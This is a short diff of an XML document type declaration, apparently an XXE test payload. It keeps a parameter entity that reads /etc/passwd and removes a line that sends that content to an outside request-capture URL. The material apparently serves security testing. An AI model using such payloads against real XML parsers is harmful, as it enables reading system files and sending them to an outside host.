@@ -2,5 +2,4 @@
 <!DOCTYPE foo [
 	<!ELEMENT foo ANY >
 	<!ENTITY %xxe SYSTEM "/etc/passwd" >
-	<!ENTITY callhome SYSTEM "https://requestb.in/1emoed31?%xxe;">
 ]>
